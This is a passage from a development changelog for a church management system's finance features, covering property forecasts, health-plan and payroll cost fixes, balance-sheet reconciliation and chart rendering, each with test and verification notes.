   into view, because on a phone it stacks *above* the list — an Edit tapped from far down a long
   register would otherwise open a form the user never scrolls back to. New
   `closeRegFormMobile()` collapses it again on Cancel and after a successful save.

Also fixed, cross-platform and minor: a register entry with no name (real, in the scanned
historical import) had its `null` concatenated into the search haystack, so every nameless record
was findable by searching "null" and any query containing that substring returned them. Now
`(e.name||'')`, in both `filterRegister()` and `printRegister()`.

**Deliberately not changed:** MOB2's global `.content-area table{display:block;overflow-x:auto}`
also applies to `.reg-table`, which already has its own `overflow-x:auto` wrapper. That looked
like a defect (a `display:block` table detaching `<thead>` from `<tbody>`) but is not — consecutive
internal-table siblings are wrapped in a *single* anonymous table box, so column widths stay
shared and the header stays aligned. Left alone rather than "fixed" on a wrong mechanism.

`npm test` (1076/1076, 16 new in `test/register-mobile.test.js`, asserting the mechanism — an ID
selector, a class-driven toggle — rather than literal text, and pinning the premises that made
the old code wrong). **Every new test verified non-vacuous** by injecting the exact regression it
guards (4 injections, 8 correct failures). Plus `node --check` on both built bundles, brace
balance on `app.css`, and a div-balance scan of the assembled `CHMS_HTML` and of the
`#tab-register` subtree. **A backtick in one of my own new CSS comments closed the outer
`String.raw` literal and broke the whole stylesheet module** — this project's documented
SC3-BUG1/FIN15 bug class, caught by the harness rather than by reading the diff. **Not verified**:
a real phone. (`src/frontend/html-head.js`, `src/frontend/js-register.js`,
`test/register-mobile.test.js`)

### v1.160.0 — Ivanhoe: base period, hidden expenses, and the capital default (2026-08-07)

Three problems reported off two live screenshots, all real, all fixed.

**1. "Does it fund itself?" printed lines that could not reach its own total.** The card showed
revenue $60,633.28 − expenses $10,229.13 − reserves $5,858.33, which is $44,545.82, above a
printed total of **$27,977.22**. Root cause is server-side: `computePropertyAnnualSummary`
(`api-finance.js`) accumulated revenue, expenses and net income independently, each behind its own
`Number.isFinite` guard. Four of the six 2026 months report net income with **no expenses line**
(the MRI format AHRA moved to in Jan 2026), so those months counted toward revenue and net income
but contributed nothing to expenses — expenses covered **2 of 6 months** and **$16,568.60** went
missing, while the total, computed independently from net income, stayed correct. Those months are
now **derived as `revenue − net income`**, which is exact rather than an estimate (the dataset's
own convention is `revenue − expenses = net income`), so `revenue − expenses` reconciles to net
income identically and the recovered figure is $16,568.60 to the cent. The card also now deducts
**mortgage principal** and builds its total **by subtraction from the lines it prints**, so it
cannot silently disagree with itself again. New `expense_months_derived` is returned per year and
named on the card, so a reconstructed figure is never passed off as one AHRA reported.

**2. The forecast projected from an invisible, unadjustable trailing-12 average.** For this
property that window straddles two different regimes — H2-2025 earned **$9,168** over six months
(two ~$12k expense months plus the tax bill) while H1-2026 earned **$33,836** at full occupancy —
and the choice of base swings 2027 from **−$12,626 to +$19,312**. The base period is now an
explicit control on the face of the card, showing all three options with their figures and each
one's own caveat. **The current-year option subtracts the property tax not yet billed**: H1 contains
no tax expense, so naively doubling it would omit the bill entirely — the mirror image of the
double-count the model already avoids. Reported reality (\$4,000 taken plus ~\$9,000 available)
reconciles to **$12,849.67**; the card now reads **$10,050.54** net to the church for 2026 to date.

**3. Capital defaulted to the ledger average, billing finished work forever.** Every entry is a
one-off (apartment renovation $18,161, HVAC $7,787, washer/dryer $8,000) — there is no recurring
capital spend — so a flat $15,196/yr allowance was charging every future year for completed
projects. It now defaults to **$0**, with the spending history and AHRA's **unfunded**
paint/asphalt/concrete reserve shown beside the input so nothing is assumed silently. Also
hardened: the POST validator accepts a bare `YYYY` `entry_date` that the allowance calculator
turned into `NaN`, rendering **"$NaN"** as the remittable figure.

**Also fixed:** `finLoadProperty` never re-rendered the Planning forecast, so losing the race
against `finLoadPlanning` left the card stuck on "Loading property forecast…" indefinitely. And
the Capital column reading "—" in production is **not a UI bug** — the model is correct; the
capital ledger is empty in live D1 (seeded behind the `finance_property_ivanhoe_reserves_v2_seeded`
marker). The card now says so explicitly rather than rendering a bare dash.

`npm test` (1035/1035, 26 new across `finance-property-annual-summary`,
`finance-property-funds-itself` and additions to `finance-property-remittable`). **Every new test
verified non-vacuous** by reintroducing the exact bug it guards — 6 injections; one initially
passed because a second `isFinite` guard caught it, so that check was redone against a full revert
of the function and correctly failed. **One existing test was updated rather than the code**: its
assertion pinned the null-expenses-become-zero behavior, which was the defect. Plus `node --check`
on both bundles and `api-finance.js`, div/table-balance across all five rendered property views and
`CHMS_HTML`, and a harness confirming a base switch preserves the growth/years/capital inputs.
**Not verified**: a live browser or real D1. (`src/api-finance.js`, `src/frontend/js-finance.js`,
`test/finance-property-annual-summary.test.js`, `test/finance-property-funds-itself.test.js`,
`test/finance-property-remittable.test.js`, `test/finance-property.test.js`)

### v1.159.0 — Ivanhoe: the valuation worksheet is back on the Property tab, and the four units now walk down to cash (2026-08-07)

Two things reported together on Finance -> Commercial Property: "we lost the valuation formulas
and worksheets that I had uploaded and you made as something to edit and keep current, now it is
just a static number," and a request for a section that takes the four actual units and their
rents, rolls them up to annual revenue, then takes out the mortgage and management fees.

**The worksheet was never lost.** `finRenderValuationCalculator` was intact and still reconciled
to AHRA's real spreadsheet; the FIN57 redesign had **moved it off the Property tab onto Data &
Imports**, collapsed behind a `<details>` labeled "Valuation calculator," on the stated principle
that "an upload control has no business on a page the council reads from." Correct for file
uploads and wrong for this one: the worksheet is not a bulk import, it is the figure the council
reads. What sat in its place on the Property tab was `finRenderPropertyValuationCard` — four
read-only tiles ending in a static Valuation number, which is exactly what was reported.

**Moved back, not copied.** Both tab panels are in the DOM at once, so a second copy would
duplicate every `fin-val-*` element id and `getElementById` would silently read whichever came
first — an edit typed on one tab saving the other tab's numbers. Data & Imports now carries a
one-line pointer instead. The worksheet also gained what "formulas and worksheet" implies and the
four tiles never showed: the line-by-line derivation, gross rental income -> less vacancy ->
effective rental income -> itemized costs -> management fee -> total operating costs -> NOI ->
capitalized value.

**One rent roll, not two.** The four units were already stored (`src/db.js`: Apartment 1,
Apartment 2, RJBJ-Crossfit, Magnatone) with square footage and annual rent — what was missing is
that those rents only ever produced a cap-rate *value*, with nothing carrying them down to cash. A
second operating rent roll kept beside the valuation one is the bug where two screens quote
different rents for the same building and both look right, so the existing roll was reused and
extended: rent $/mo alongside the annual box (leases are quoted monthly), $/SF, share of revenue,
a **vacant** flag at zero rent, and a totals row. Monthly and annual are two views of one stored
`annual_rent_cents`; typing in either rewrites *the other* box only, never the one being typed in
— the controlled-input round-trip FIN52 root-caused.

**New pure `finComputePropertyProForma(d, opts)`** walks from the leases up: contract rent +
utility reimbursement - vacancy = effective gross income; - itemized operating costs - management
fee = NOI; - mortgage interest - mortgage principal - capital allowance = cash to the church. It
reuses `finComputePropertyValuation`, `finAmortizationSchedule`,
`finComputePropertyCapitalAllowanceCents` and `finComputePropertyTrailingNetIncome` rather than
re-deriving any of it, and the treatment below NOI is deliberately identical to
`finComputeRemittableForecast` so the two cannot drift.

- **Property tax is not deducted twice.** It is already an itemized operating cost; the monthly
  reserve is a timing mechanism, not an extra cost. The card states this on the page, because it
  is precisely the double-count a reader will suspect — and a test injects the double-deduction to
  prove the guard is real.
- **Two readings, and the gap named.** `finComputeRemittableForecast` (FIN61) works from AHRA's
  *reported* net income down; this works from the leases up. Both are printed and the difference
  is stated rather than averaged away — a rent roll that disagrees with the operating statements
  is itself the finding. Against the real seeded data the two agree on the conclusion: 2027 cash
  is **negative** either way.
- **DSCR** is reported, and returns `null` rather than `Infinity` once the loan is paid off, so
  the card says so in words instead of printing a meaningless ratio.

**Verification.** `npm test` (1036/1036, 25 new in `test/finance-property-proforma.test.js`,
running the real built bundle in a `vm` rather than the source). **Every new test verified
non-vacuous** by injecting the exact regression it guards — property tax deducted twice, mortgage
principal dropped, the focused input rewritten mid-typing, a vacant unit silently dropped from the
roll, DSCR reported as Infinity after payoff — 5 injections, 5 correct failures, each caught by
the test that names it. Plus `node --check` on both built bundles, a div-balance scan of the
assembled `CHMS_HTML` (1080/1080), and tag-balance across all five rendered surfaces including the
empty state and the non-admin state (every input rendered, disabled). `finComputePropertyValuation`
itself is untouched, so the existing test reconciling it to AHRA's worksheet passes unchanged —
confirmed end to end against the real seeded figures: NOI $54,905.19 at the seeded 0.08 cap rate
gives $686,314.88, matching AHRA's own $686,314.86. **Not verified**: a live browser or real D1.

No schema change and no new endpoint — saving still goes through the existing meta `PATCH`.
(`src/frontend/js-finance.js`, `test/finance-property-proforma.test.js`)
### v1.159.0 — Dental and vision are per covered worker, not a group bill re-shared (2026-08-07)

Correction from the church, with the figure to check against: a family-tier worker's health cost is
**$29,130.48** — $24,612.00 medical ($2,051.00/mo x 12) plus the full $3,046.80 dental and $1,471.68
vision. Dental and vision belong to whoever is on the health plan, each carrying the whole annual
figure. The packet simply does not tier-price them the way it does medical, which is why they appear
as one annual number each rather than a rate per coverage tier.

**What was wrong.** Those two figures were modelled as a single group bill divided across whoever
was enrolled (`(dental + vision) / enrolledCount`). Three consequences, all wrong: a covered
worker's dental and vision fell every time a colleague joined the plan; adding a covered worker
added nothing at all to the church's total; and a family-tier worker priced at $26,871.24 instead of
$29,130.48. New `finHealthAncillaryPerContractCents()`; `finCompWorkerHealthCents` adds the figures
outright and `finComputeHealthPlanTotalCents` multiplies them by the covered count.

**An intermediate attempt is worth recording as a wrong turn**, because it was plausible: reading
the packet figures as the cost *at the quoted enrollment* (2 contracts) and deriving a per-contract
half. That keeps each worker's cost constant and scales the group total, so it fixes two of the
three symptoms — and at the quoted enrollment it reproduces every previously-shipped number exactly,
which made it look confirmed. It priced a worker at $26,871.24. The church's own $29,130.48 is what
ruled it out. **Do not re-derive a per-contract figure by dividing these by the quoted enrollment.**

**Figures that changed.** A family-tier worker: $26,871.24 -> $29,130.48. Renewal at the quoted 2
contracts: $53,742.48 -> $58,260.96. Dinger in the worked example: church cost $147,661 -> $149,921.
Medical is untouched and still reconciles to the packet's printed Total Monthly $4,102.00 and Total
Annual $49,224.00. Five existing tests encoded the old group-bill reading and were updated with the
reasoning; one exclusion test written last version around the re-sharing behavior is gone, since
nothing is re-shared now — an excluded worker's health leaves cleanly and moves nobody else's.

**Verified:** `npm test` (1013/1013). A harness against the real shape prices Andrew, Mark and Jinah
at $29,130.48 each and the group at $87,391.44 for three covered, with an opted-out worker at $0.
Also `node --check` on both bundles. **Not verified:** a live browser.


### v1.158.0 — "Paid from another budget" flag on the compensation roster (2026-08-07)

Reported: the Council summary's employer FICA line read $11,319 where the church's own figure is
$8,186.72 — Jinah $74,516 + Linda $13,000 + Kati $19,500 at 7.65%. Confirmed, and traced by
arithmetic rather than guesswork: $11,319 / 7.65% implies a FICA base of $147,960.78, which is
$40,944.78 more than those three, i.e. exactly one more worker. That is Jacinda, MDO staff paid
from another section. (Cross-check on the same method: pension $28,823 / 11.70% = $246,350 and
disability $4,311 / 1.75% = $246,343 — the three called workers, to the dollar. So the roster
already treated her as benefit-ineligible; salary and FICA were what leaked in.)

**The app had no way to express it.** Employer FICA is charged to every roster worker whose
Self-Employed (SECA) box is unchecked, full stop. And the problem was bigger than the FICA line:
her salary was also in Cash Salaries and the FY total, so ticking SECA to "fix" FICA would have
left the headline number overstated while looking corrected.

New per-worker **Paid from another budget** flag (`w.externallyFunded`, on the worker drawer under
"1 · Set pay"). A flagged worker stays on the roster and stays visible, but is out of **every**
church figure: salary, pension, health, disability, employer FICA, the FY total, the group health
contract count, the district-scale and LCMS-median comparisons, the method-comparison totals, Send
to budget, and the Council report. Their Council row still shows their pay, grayed, with the
scale/median columns replaced by "Costed in another section — in no total here", and both the
screen and the printed report name who is excluded and why. Stored on the roster row, so it saves
with everything else — no endpoint, no migration.

**One thing it deliberately does not touch**: `finCompBaselineCents`, the FY base-year comparison,
which is read off the church's real payroll accounts rather than off this roster. If the worker
really is paid from another budget their pay is not in those accounts and nothing needs adjusting;
if it turns out to be, the honest fix is the account, not a second exclusion rule. The excluded-
worker note says so in as many words.

**A modelling subtlety the tests surfaced, worth knowing**: dental and vision are quoted as one
annual figure for the whole group, not per contract. So excluding a worker who is *enrolled in the
health plan* re-shares that same bill across fewer people rather than shrinking it — the total does
not simply fall by their own health line. Their medical tier rate does leave. Pinned by its own
test. It does not arise in the reported case (Jacinda is not on the church plan), but it would if
an enrolled worker were ever flagged.

**Verified:** `npm test` (1011/1011, 9 new). Checked non-vacuous by stubbing the predicate to
`false` — 6 of the 9 fail. Two of my own tests initially failed on a wrong premise (assuming the
total falls by exactly the excluded worker's cost) and were rewritten around the real behavior
rather than forced. Also a harness reproducing the reported roster end to end: employer FICA falls
from $11,319.00 to **$8,186.72**, matching the church's own figure to the cent, with the FY total
falling $44,077.06 and tag balance holding. **Not verified:** a live browser or a real print dialog.


### v1.157.0 — Council summary: what the benefits & taxes figure is made of (2026-08-07)

Asked for on the Council summary page: a section under the worker table breaking out Pension Cost
and Health Plan Cost. Built as the full four-line breakdown rather than the two named, because a
partial list sitting directly under a $103,445 tile that it doesn't add up to is worse than no
breakdown — the components are exactly the four `finCompBenefits` sums (pension, health plan,
disability & survivor, employer FICA), so the parts always reconcile to the total above them.

Each line carries the rate it comes from and how many of the roster it actually covers — a $0 or
short line reads as a bug unless it says who is on it. Employer FICA is the clearest case: it
covers only the non-ministers, because a minister pays their own SECA. That self-paid amount is
stated underneath as explicitly not a church cost and in no figure above, rather than left to look
like a missing line.

New pure `finCompBenefitBreakdown(computed)` backs both the on-screen section and the same table
added to the printed Council report, so the screen and the printout can't answer the question
differently.

**Verified:** `npm test` (1002/1002, 5 new). Checked non-vacuous by dropping the employer-FICA
component — 4 of the 5 fail, including reconciliation. Also a render of the real Council view
against a live-shaped roster (parts summed to the tile to the cent; tag balance 31/31 divs, 48/48
cells; breakdown confirmed to sit after the worker table), and `node --check` on both bundles.
**Not verified:** a live browser or a real print dialog.


### v1.156.0 — Ivanhoe forecast reports remittable cash, not net income (2026-08-07)

Reported from the Planning tab: the "3277 Ivanhoe forecast" card projected **$43,864 for 2027**
under the heading *"what the property can be expected to remit"*, and that could not be right
because nothing was being held back for taxes, reserves or other obligations.

Confirmed, and the number was wrong for a bigger reason than reserves. **$43,003.75 is the
trailing-12-month average of AHRA's reported net income** (Jul 2025 – Jun 2026), grown 2%, with
**nothing deducted at all**. The card's own table header even read "Projected Annual Net Income"
while the title above it promised remittance — two different claims about one figure.

**Three real defects:**
1. **Mortgage principal was never subtracted.** The old comment assumed debt service was already
   inside AHRA's net income. Half true — *interest* is an expense and is inside it; *principal*
   is a balance-sheet movement that never touches the P&L, and it is ~$35,700/yr of cash.
2. **Post-payoff double-count.** Post-payoff years *added back* `annual_debt_service_cents` on top
   of a base it had never been taken out of.
3. **Capital spending was invisible.** ~$15,200/yr, capitalized so never an expense. AHRA's own
   paint/asphalt/concrete reserve line exists but is funded at $0.

**Deliberately NOT deducted, because each would double-count:** property tax (the bill already
lands as an expense inside net income — Dec 2025 expenses were $14,631; the monthly reserve is a
*timing* mechanism, not an extra cost), the $4,500 base-minimum reserve (a one-time floor, already
funded), and the ~$15,263/yr allocated church insurance (the church budget already carries it as
its own expense line, so it is a memo beside the card, never subtracted).

**The model**, one pure function every consumer reads rather than re-deriving:
`remittable = operating income grown at the rate − scheduled interest − scheduled principal −
capital allowance`. Growing *operating* income (net income before interest) is what makes it
correct: rents grow, a fixed mortgage payment does not. Interest and principal come from a real
per-year amortization schedule, so both simply fall to zero at payoff and **no add-back fudge is
needed at all**.

Result for 2027: **−$5,849**, not +$43,864. Against actual distributions of $34,000 (2024),
$8,000 (2025) and $4,000 (2026 YTD), that is the right order of magnitude — and the
Available-for-Distribution bar now reads $6,051 for 2026 YTD against the $4,000 actually sent.
The card says in words that the property does not currently fund a distribution out of its own
earnings, and that this changes around the 2033 payoff (~$54,579/yr thereafter).

**Also fixed:** the amortization anchored its payoff clock to `new Date()` rather than the
lender-confirmed `balance_as_of_date`, so it slid forward on every render; the year-by-year table
re-derived the math from three `window._finPmf*` globals instead of reading the same rows the
tiles did (which is how the two came to disagree); and the Available-for-Distribution bar was
missing the principal line entirely. All three consumers now read one model.

**Two data conflicts surfaced rather than silently resolved** (both shown on the card with a
"confirm with LCEF" prompt): confirmed with the pastor that `monthly_payment_cents` ($4,283.03) is
principal + interest, which means the field *named* `annual_debt_service_cents` ($45,396.36) is
actually the principal portion — mislabeled; and the June 2026 report's interest of $952.05/mo
implies a balance near $179,209, against the confirmed $279,691.13. Nothing trusts either
constant now — interest and principal are amortized from the confirmed balance and rate.

**One bug caught in my own work by the harness, not by reading:** the base-interest fallback
averaged the 6-month anchor year against a full year instead of annualizing, understating interest
enough to drag projected net income *below* the base it grew from. It now takes the first twelve
*scheduled months*.

`npm test` (960/960, 23 new in `test/finance-property-remittable.test.js`); **every new test
verified non-vacuous** by injecting the exact regression it guards — 5 injections, all produced
the expected failures. Two existing property tests needed their loaders switched from
single-function regex extraction to the `vm`-bundle technique, since the functions they extract now
have dependencies. Plus `node --check` on both built bundles, a div/table-balance scan of all four
rendered views and of the assembled `CHMS_HTML`, and a harness confirming Planning and the Property
tab print the identical remittable figure. **Not verified**: a live browser or real D1.
(`src/frontend/js-finance.js`, `test/finance-property-remittable.test.js`,
`test/finance-property-forecast.test.js`, `test/finance-property-distribution.test.js`)


### v1.155.0 — Embedded / non-embedded marked on each plan, and the spread-cost model generalised (2026-08-07)

Follow-up to the single/family deductible split below, working from the plan's own definition
supplied by the church (non-embedded
= a true family deductible, no individual limits, one person can pay the whole family amount;
embedded = each member has their own limit inside the family limit and starts paying coinsurance
once they meet it, even if the family deductible has not been met).

**First: the existing lone-claimant maths was already right.** Verified against all five options
rather than assumed — embedded resolves to the individual figures, non-embedded to the family
figures, deductible and out-of-pocket max both. No change was needed and none was made.

**Badges.** Each row of the rates table now carries an Embedded / Non-embedded badge derived from
the option's own flag (not a hand-written per-plan string, which could drift from the maths it
describes), plus a legend. This exists because v1.151.0's new "Deductible — single" column could
otherwise be misread on the two non-embedded options as a per-person cap inside family coverage —
it is not; there, that figure is the self-only-contract deductible.

**Spread-cost model generalised.** New `finComputeFamilyOOPCents(opt, rate, spend, members)`
replaces the family-deductible-only calculation inside the breakeven. It caps each member's
contribution toward the family deductible at the individual figure and flips them to coinsurance
once they pass it. It reduces exactly to the old calculation for a non-embedded plan at any member
count, and to the lone-claimant case at one member.

**The honest result: for this quote it changes nothing, and the reason is worth recording.** The
refinement can only move a figure when (members x single deductible) < family deductible. Every
option in this renewal sets the family deductible at exactly 2x the single one, so that holds only
at one member — which is the lone-claimant case, already modelled separately. Two or more people
always reach the pooled limit at the same point. Confirmed by exhaustive comparison across all five
options, member counts 2-5, and spends from $1k to $30k: identical to the previous model in every
case. A synthetic option with a 3x ratio does differ at two members, which is what pins the
generalisation as real rather than decorative.

**So the family-size control is shown only when it can matter** (`finHealthFamilySizeMatters`,
derived from the data). For the current quote it is hidden and replaced by a line explaining that
the count makes no difference here and that the two rows below — costs shared, versus one member
alone — bracket the real range. Offering a picker that provably cannot change a number is the
control-that-does-nothing trap this codebase has hit before. A future quote with a different ratio
turns it back on by itself.

**Also fixed:** v1.151.0's `finHealthPlanResolvedOption` returned only the four resolved numbers and
dropped every other field, so `selOpt.label` rendered as "undefined" in the breakeven callout
heading. It now carries the whole option through.

**Verified:** `npm test` (862/862, 6 new). Three tests initially failed on a wrong premise of mine
rather than a code fault, and were rewritten around the derived rule instead of being forced. One
`String.raw` backtick-in-a-comment break (the SC3-BUG1 class) was caught by the suite itself. Also
`node --check` on both bundles and a render check of the callout and all five badges. **Not
verified:** a live browser.

### v1.154.0 — Giving pace is General Fund only; cash runway reads the balance sheet (2026-08-07)

**Reported**, with a screenshot of the Financial Health page: the giving-pace chart should count
only General Fund giving (the 40085 family) — "all the other giving could be to things like
Concordia Children's which is just pass through" — and the operating cash runway should come off
the balance sheet, where **11027 Lindell Checking xx9105** is the operating account.

**The pace chart was counting every fund.** Designated and pass-through giving arrives and leaves;
counting it showed the operating budget being met by money that was never available to meet it.
Now scoped to the General Fund family using `resolveGeneralFundIds()` — **extracted from the giving
board handler rather than written again**, because a second copy of that rule is precisely the bug
where two screens each quote a "General Fund giving" total and both look right. The board report
now calls the shared helper; its 46 tests were untouched and still pass.

**The budget line had to move with it.** It was `revenueStreams.streams.donor.budgetCents` — every
donor account's budget. Against one fund's giving that reads as a permanent shortfall. It now comes
from the same source the board report's General Fund card uses: the church ledger accounts sharing
the fund family's leading numeric code ("40085 Sunday Offering"). `null`, never `0`, when nothing
has been imported for those accounts — the card then draws no pace line rather than a false one.

The card also now **names what it left out** ("$X given to designated and pass-through funds is not
counted here"), and says plainly when it is still counting every fund because no fund has been
categorized as General yet. The Church Report's own all-funds giving reference line is unchanged —
only the pace chart is scoped.

**Cash on hand now prefers the imported balance sheet** over the QuickBooks account snapshot. The
snapshot is a name match over whatever accounts happen to be connected; the balance sheet is the
church's own confirmed statement of position. New `operatingCashFromBalanceSheet()`, with the
operating account pinned by code (Data & Imports → Classification & policy, `cash_account_code`).
Three deliberate limits: it only reads **Assets** rows (the code match is a string prefix, and a
liability line sharing the code would otherwise be added into cash), it **skips rollup rows** so a
parent and its children are never both counted, and unlike the QuickBooks path it does **not** sweep
in savings/reserve accounts — restricted reserves are not operating cash, and a runway built on
money already promised elsewhere overstates how long the lights stay on. The matched account names
and the statement's as-of date come back with the figure and are printed on the card, because an
unpinned name match could just as easily pick up the daycare checking account, and a figure from an
older statement must not read as today's bank balance. A hand-entered figure still overrides
everything.

**Also fixed, straight off the screenshot**: the chart's "Actual" and "Budget" end labels printed on
top of each other. Not because the lines were equal — the two labels carry opposite fixed offsets,
so they collide when the actual line sits ~14px *above* the budget line, which is giving running a
little ahead of pace. The healthy case was the unreadable one. They now push apart to a minimum gap,
keeping each label on the side of its own line.

`npm test` (923/923, 31 new across `test/finance-giving-pace-cash.test.js` — the shared fund rule,
the real route against real in-memory SQLite, and the real render functions out of the real built
bundle — plus balance-sheet cash cases in `test/finance-health.test.js`). Every new test verified
non-vacuous by injecting the exact regression it guards: eight injections, eight correct failures.
One of those tests earned its keep immediately — the route test caught a missing `import` of
`resolveGeneralFundIds` in `api-finance.js`, which would have been a live 500 on the whole Finance
tab. A first attempt at the label-overlap test passed against the broken code and was rewritten
around the real geometry rather than kept.

**Not verified**: a live browser or real D1. **One step for an admin**: put `11027` in *Operating
cash account code* under Data & Imports → Classification & policy. Left blank it matches any asset
account named "checking", which on this chart of accounts also picks up the daycare account — the
card names whatever it summed, so this is visible rather than silent.

### v1.152.0 — Past-year balance sheets, tied out against the P&L; empty COGS row dropped (2026-08-07)

(Two unrelated sessions both landed a v1.152.0 on the same day — see also "Funds sharing a leading
code combine into one line" further down. Both are in main; the numbers are not renumbered because
they are already deployed.)

**Reported**, with two screenshots: the Balance Sheet view's Multi-Year Trend shows bars for 2026
only, while the Church Report's Multi-Year table has real figures back to 2022. Two asks — upload
balance sheets for the past years and confirm them against those years' P&L, and remove the Cost
of Goods Sold row, since this church does not sell anything.

**The upload path already existed and still does** — no new importer was written. Data & Imports
carries both *Balance Sheet* (one year, fiscal year read from the file's own "As of" line) and
*Financial Position (multi-year)* (one file covering many years). Neither has ever had a year
restriction. What was missing was everything *around* the upload:

- **The snapshot was pinned to the current year.** `finLoadChurchBalances()` defaulted to
  `new Date().getFullYear()` and nothing ever called it with anything else, so a 2022 balance
  sheet could be imported successfully and then never be looked at. There is now a year box, and
  the empty state renders the picker *above* the "nothing imported for this year" message — before,
  landing on a year with no data was a dead end with no way back to a year that had some, which is
  the normal state while history is still being loaded.
- **The trend window was the server's rolling five years.** Same problem the income statement's
  Multi-Year view solved with a From/To picker; the balance sheet now has the same control.
- **Nothing checked the two reports against each other.** New `computeBalanceVsPnlReconciliation()`
  (`api-finance.js`): a year's change in total equity should equal that year's net income, because
  every other equity movement nets to zero inside total equity. Returned by
  `GET finance/church/balances/multi-year` alongside a new `netIncomeByYear`, rendered as a
  "Balance Sheet vs. Income Statement" table (opening equity, closing equity, change, net income,
  check).

Three judgment calls in that tie-out worth recording:

1. **A difference is reported as a difference, never as a failure.** A cash-basis balance sheet
   next to an accrual P&L — this church has at least one such year on file, which is why the import
   already carries a basis flag — or a prior-period adjustment booked straight to equity produces a
   real, legitimate difference. Calling that a bad import would train an admin to ignore the check.
2. **Only consecutive years are compared.** If 2023 was never uploaded, 2024 is *not* checked
   against 2022 — that would silently attribute two years of movement to one year's net income.
   It says "no 2023 balance sheet — upload it to check this year" instead, so the table also
   answers "which year do I still need?".
3. **The endpoint fetches one year BEFORE the requested range** purely for opening equity.
   Otherwise the earliest year in the window always reported "no prior balance sheet" as an
   artifact of where the range picker happened to start.

`computeBalanceSummary()` returns a fully zeroed summary for a year with no rows, which is
indistinguishable from a real $0 equity except by the empty `classificationTotals` map — the
reconciliation checks that map, so a not-yet-uploaded year can never masquerade as a $150k swing.

**Cost of Goods Sold** is hidden when every year in the window is zero, in the multi-year table and
in the CSV export — not deleted. If a COGS figure ever exists the row returns, so the visible rows
always still add up to the Net Income printed beneath them. This is FIN58's lesson applied: never
hide a dollar that a total on the same screen is still counting. `computeYearSummary()` is
untouched and still subtracts COGS into gross profit.

`npm test` (892/892, 17 new across `test/finance-balance-pnl-recon.test.js` — the pure function
plus the real route against real in-memory SQLite — and `test/finance-balance-recon-ui.test.js`,
which drives the real render functions out of the real built bundle). Every new test verified
non-vacuous by injecting the exact regression it guards: six injections, six correct failures
(dropped opening-year fetch, zeroed-summary-as-real-data, swallowing tolerance, unconditional COGS
row in the table and again in the CSV, and an empty state that loses its picker). Plus
`node --check` on both built bundles and a div-balance scan of the assembled `CHMS_HTML`.

**Not verified**: a live browser or real D1. **Next step is the user's**: upload the past years
from Data & Imports, then open Church Report → Balance sheet and widen the trend range — the
tie-out table will name any year whose equity movement does not match its net income.
### v1.149.0 — "How the money moves": four-column Sankey + Share view (2026-08-06)

Implements `flow-diagram.md`, the addition to the Finance Workspace bundle (the rest of that
bundle is byte-identical to what shipped in v1.148.0 — only this file and its two reference PNGs
are new). It replaces the simple three-column ribbon drawing on the Financial Health page with the
handoff's real design: **Sources → Streams → All revenue → Where it goes**, plus a **Share** view
of two donuts behind a toggle.

**The explicit ask on this work was that nothing overlap**, so most of the effort went there
rather than into the coordinates. The handoff authors its geometry against one year's figures,
where the nodes happen to be tall enough that its fixed gaps (10/18/14/18/18/16) are sufficient.
Real data is not that obliging — twenty small revenue lines, or one line dwarfing the rest, would
stack labels straight through each other. So:

- Each label's real vertical extent is computed, and the next node is pushed down until the two
  cannot touch. **The authored gaps are a floor, never a ceiling** — with the handoff's own
  figures they are always the larger of the two, so the reference rendering is reproduced exactly
  (S=0.40, sources at y=22, canvas 626); with anything else the constraint takes over silently.
- A node too short for a two-line label is demoted to one line, per the handoff's own rule.
- Labels are truncated to a per-column width cap so a long account name cannot run into the next
  column. The two caps that matter are the total's (110) and the expenses' (300): the total's
  label runs right from x=628 and the expense labels run LEFT from x=1056, so their widths have to
  be bounded such that the two can never meet.
- The canvas **grows** rather than letting a column run off it. A clamped scale keeps labels
  legible but can still produce a column taller than a fixed 626-unit box, and a column running
  off the canvas is its own kind of collision.
- Character width is measured through one shared helper (`finFlowCharW`, 0.62em — DM Sans averages
  nearer 0.55em, so it errs wide). A hand-picked constant that under-estimates is exactly how a
  label bleeds into the next column, and an earlier draft did precisely that: the collision test
  caught a source label reaching x=334 against a 330 column boundary.

**Verification is geometric, not visual.** `test/finance-flow-diagram.test.js` (36 tests) renders
the REAL SVG across fifteen deliberately hostile data shapes — twelve near-equal sources, one
giant plus eleven slivers, ascending dust, a single source, each at 1x / 0.05x / 12x scale —
extracts every `<text>` element, estimates its box from its own attributes, and asserts no two
intersect. It also asserts bars never overlap, labels never pass the footer rule, and the outflow
ribbons tile the revenue bar exactly. The `vm` harness runs the same sweep over **every SVG on the
Financial Health page**, not just the Sankey.

**Both sweeps were verified non-vacuous by injecting the exact regression each guards**: removing
the label-constraint push, never demoting a short node's label, dropping truncation, fixing the
canvas at 626, and dropping the outflow scale factor k. The k injection initially passed — that
test computed k itself rather than checking the renderer used it — so it was rewritten to parse
the rendered ribbon paths and assert they tile the bar. It now fails as it should.

Two measurement bugs in the *tests* were found and fixed along the way, both of which had produced
phantom collisions: HTML entities were counted as five-to-seven characters instead of one glyph,
and a `<text>` inheriting `font-size` from its parent `<g>` was measured at the 12px default.

**Also new:**
- **Share view** — two donuts (Money in / Money out) with legend rows carrying amount and percent,
  segments laid end to end around the circumference via `stroke-dasharray`/`dashoffset`.
- **Toggle** — real `<button aria-pressed>` elements, choice persisted in `localStorage` under
  `finance.flowView`. Below the phone tier the Sankey's four label columns cannot be laid out
  honestly, so **CSS** (not JS) forces the Share view and hides the toggle — which means a window
  resize is handled with no listener. Print shows both.
- **Expense categories** — the board's five (`mdo`/`salaries`/`property`/`education`/`programs`)
  from a GL-account → category map in `chms_config`, admin-editable on Data & Imports, with the
  unmapped-account validation report the handoff asks for. An unrecognized account lands in
  `programs` rather than being dropped: every account has to appear somewhere or the outflow stops
  matching total expenses, and a silently-dropped account is worse than a visibly-miscategorized
  one.
- **Donor split** — when the donor stream is a single GL group and ChMS records a real restricted
  share, that node is divided in two using the ChMS ratio. The card says so: applying a measured
  ratio to a measured total is an allocation, not a flag the ledger itself carries.
- `GET /admin/api/finance/flow?fy=` — the contract the handoff names. The Health page reads the
  same figures off `church/this-year` instead of calling it, so the two cannot disagree: both come
  from `computeFlowDiagram()`.
- A visually-hidden data table (`.fin-sr-only`) so screen readers and Ctrl-F reach the same
  figures the chart draws, and an `aria-label` built from the data naming the largest flows.

**Reconciled with `main` on rebase, which had moved on.** Another session had fixed a live
regression in the v1.148.0 revenue grouping — `category_path` carries its classification as
segment 0, so reading segment 0 collapsed the whole chart of accounts into one group named
"Income" and reported a 100%-earned mix with $0 donor revenue — and had added **restricted** as a
